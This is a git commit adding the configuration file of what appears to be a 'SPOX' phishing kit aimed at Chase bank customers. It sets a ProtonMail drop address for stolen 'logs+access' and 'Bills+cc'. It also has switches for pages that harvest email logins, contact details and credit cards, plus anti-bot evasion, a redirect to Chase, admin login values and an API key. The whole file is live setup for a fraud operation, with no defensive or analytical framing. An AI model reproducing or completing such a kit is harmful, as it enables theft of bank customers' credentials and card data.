ffada4d93282b8c848d1b7200d754dcd0249d57a
olaitan12 <olaitanaderoju@gmail.com>
2020-10-27 10:48:20 +0100

    fitst commit

---
+++ admin/YOUR-CONFIG.php
@@ -0,0 +1,44 @@
+<?php
+
+
+// SPAM INFO
+
+$yourname = "SPOX";
+$your_email = "kellogs911_services@protonmail.com"; // logs+access
+$your_email2 = "kellogs911_services@protonmail.com"; // Bills+cc
+
+
+//ADMIN LOGIN INFO
+
+$username = "az";
+$password = "ze";
+$pin = "645345343256451"; 
+// Redirect
+
+$redirect = "chase";
+
+
+// ON / OFF 
+$spam_hotmail = "no";
+$double_login = "no";
+$double_access = "yes";
+$spox_protection = "yes";
+$redirection = "yes";
+$double_cc = "no";
+$show_start_page = "yes"; 
+$show_email_access = "yes"; 
+$show_contact_information = "yes";
+$show_credit_card = "yes";
+$show_success_page = "yes";
+$anti_bot = "yes";
+
+
+
+// KEY PROTECTION
+$api = "3c23ec5db070f21c3f5ed5cd77324914";
+
+
+
+
+
+?>
